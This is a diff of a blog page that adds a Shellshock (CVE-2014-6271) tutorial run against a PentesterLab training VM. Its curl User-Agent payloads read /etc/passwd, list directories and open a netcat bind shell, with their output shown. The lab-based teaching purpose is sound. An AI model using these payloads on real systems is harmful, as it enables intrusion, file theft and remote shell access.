@@ -14,6 +14,133 @@
 <div id="description">Hacking tutorials + info</div>
 </div></div></div>
 <div id="divbody"><div class="content">
+<h3><a class="ablack" href="shellshock-explained--exploitation-tutorial.html">
+Shellshock Explained + Exploitation Tutorial
+</a></h3>
+<!-- bashblog_timestamp: #201607021801.02# -->
+<div class="subtitle">July 02, 2016 &mdash; 
+metalkey
+</div>
+<!-- text begin -->
+
+<h2>Introduction</h2>
+
+<p>Shellshock is a “code injection attack” that takes advantage of a function definition vulnerability in Bash 4.3 and earlier.<br>
+The vulnerability is caused by Bash processing trailing strings after function definitions in the values of environment variables. In Bash 4.3 and later, these trailing strings will not be executed.</p>
+
+<h2>Testing</h2>
+
+<p>To test if your system is vulnerable, simply run the command below in a Bash shell.
+<code></p>
+
+<div class="code">
+user@debian8:~$ <com>env x='() { :;}; echo vulnerable' bash -c "echo not-vulnerable"</com>
+</div>
+
+<p></code>
+If 'vulnerable' is echoed back, your system is vulnerable, since echo vulnerable is directly after the function definition env x='() { :;};<br>
+A response of 'not-vulnerable' indicates your system is not vulnerable to the test above.<br>
+Note: Additional tests should be performed to confirm your system is not vulnerable to Shellshock.<br>
+These tests can be found on the Shellshocker Website - <a href="https://shellshocker.net/">https://shellshocker.net/</a></p>
+
+<h2>Exploitation</h2>
+
+<p>Launch the 'Pentester Lab: CVE-2014-6271 Shellshock' VM (<a href="https://pentesterlab.com/exercises/cve-2014-6271">https://pentesterlab.com/exercises/cve-2014-6271</a>) then browse to the VM’s IP in your web-browser.<br>
+You will be presented with the output of the [uptime] and [uname -a] Linux commands, running on the Pentesterlab VM.</p>
+
+<blockquote>
+  <p>CVE-2014-6271<br>
+This system is running:<br>
+uptime: 20:44:15 up 0 min, 1 users, load average: 0.06, 0.01, 0.00<br>
+kernel: Linux vulnerable 3.14.1-pentesterlab #1 SMP Sun Jul 6 09:16:00 EST 2014 i686 GNU/Linux<br></p>
+</blockquote>
+
+<p>View the page source and you’ll notice the location of the CGI (<a href="http://www.techrepublic.com/article/cgi-crash-course-how-to-run-cgi-scripts/">http://www.techrepublic.com/article/cgi-crash-course-how-to-run-cgi-scripts/</a>) script that is executed on the server.</p>
+
+<blockquote>
+  <p>$.getJSON("/cgi-bin/status", function (data) {<br></p>
+</blockquote>
+
+<p>Let’s use curl to launch a few shellshock attacks against the status CGI script via the User-Agent string (-A in curl).</p>
+
+<h2>Passwd File</h2>
+
+<p><code></p>
+
+<div class="code">
+user@debian8:~$ <com>curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/cat /etc/passwd' http://192.168.1.14/cgi-bin/status > passwd</com><br>
+<br>
+user@debian8:~$ <com>cat passwd</com><br>
+root:x:0:0:root:/root:/bin/sh<br>
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>
+nobody:x:65534:65534:nobody:/nonexistent:/bin/false<br>
+tc:x:1001:50:Linux User,,,:/home/tc:/bin/sh<br>
+pentesterlab:x:1000:50:Linux User,,,:/home/pentesterlab:/bin/sh 
+</div>
+
+<p></code></p>
+
+<h2>Directory Listing</h2>
+
+<p><code></p>
+
+<div class="code">
+user@debian8:~$ <com>curl -A '() { :;}; echo "Content-Type: text/plain"; echo; /bin/ls /' http://192.168.1.14/cgi-bin/status</com><br>
+bin<br>
+boot<br>
+dev<br>
+etc<br>
+home<br>
+init<br>
+...
+</div>
+
+<p></code></p>
+
+<h2>Bind Shell</h2>
+
+<p>Bind an instance of Bash to a netcat listener on port 2345 and connect.<br>
+After executing the bind shell on the Shellshock VM (/usr/bin/nc -lvvp 2345 -e /bin/bash) you will need to open a new terminal window to connect using (nc -vn 192.168.1.14 2345)
+<code></p>
+
+<div class="code">
+user@debian8:~$ <com>curl -A '() { :; }; /bin/bash -c "/usr/bin/nc -lvvp 2345 -e /bin/bash"' http://192.168.1.14/cgi-bin/status</com><br>
+<br>
+user@debian8:~$ <com>nc -vn 192.168.1.14 2345</com><br>
+(UNKNOWN) [192.168.1.14] 2345 (?) open<br>
+<br>
+<com>whoami</com><br>
+pentesterlab<br>
+<br>
+<com>/sbin/ifconfig</com><br>
+[eth0]<br>
+Link encap:Ethernet HWaddr 08:00:27:84:1F:23<br>
+inet addr:192.168.1.14 Bcast:192.168.1.255 Mask:255.255.255.0<br>
+inet6 addr: fe80::a00:27ff:fe84:1f23/64 Scope:Link<br>
+UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1<br>
+RX packets:742 errors:0 dropped:0 overruns:0 frame:0<br>
+TX packets:426 errors:0 dropped:0 overruns:0 carrier:0<br>
+collisions:0 txqueuelen:1000<br>
+RX bytes:57418 (56.0 KiB) TX bytes:246492 (240.7 KiB)<br>
+Interrupt:10 Base address:0xd020
+</div>
+
+<p></code></p>
+
+<h2>Conclusion</h2>
+
+<p>The examples above demonstrate a tiny fraction of what is possible using the Shellshock vulnerability.<br>
+<br>
+Additional attack vectors include:<br>
+– OpenSSH server<br>
+– DHCP clients<br>
+– Qmail server<br>
+– IBM HMC restricted shell<br>
+<br>
+If your system is vulnerable, ensure it is patched immediately by upgrading your version of Bash then re-testing.
+Tags: shellshock</p>
+
+<!-- text end -->
 <h3><a class="ablack" href="shellter---the-ultimate-tool-for-av-evasion.html">
 Shellter – The ultimate tool for AV evasion
 </a></h3>
